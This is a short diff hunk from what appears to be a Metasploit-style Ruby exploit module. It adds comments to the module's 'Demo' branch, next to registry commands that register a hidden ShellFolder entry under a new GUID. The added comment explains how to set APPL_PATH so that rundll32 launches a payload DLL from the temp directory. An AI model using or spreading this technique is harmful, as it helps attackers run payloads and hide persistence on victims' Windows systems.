@@ -262,6 +262,10 @@ def run
         '#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f'
        ]
      else
+       #
+       # This option [DEMO] can still be configurated to launch an payload.dll
+       # for that we just need to input: set APPL_PATH rundll32 %tmp%\\payload.dll,main ;)
+       #
        print_status("Exploit Demo mode selected ..")
        Rex::sleep(1.0)
        hacks = [
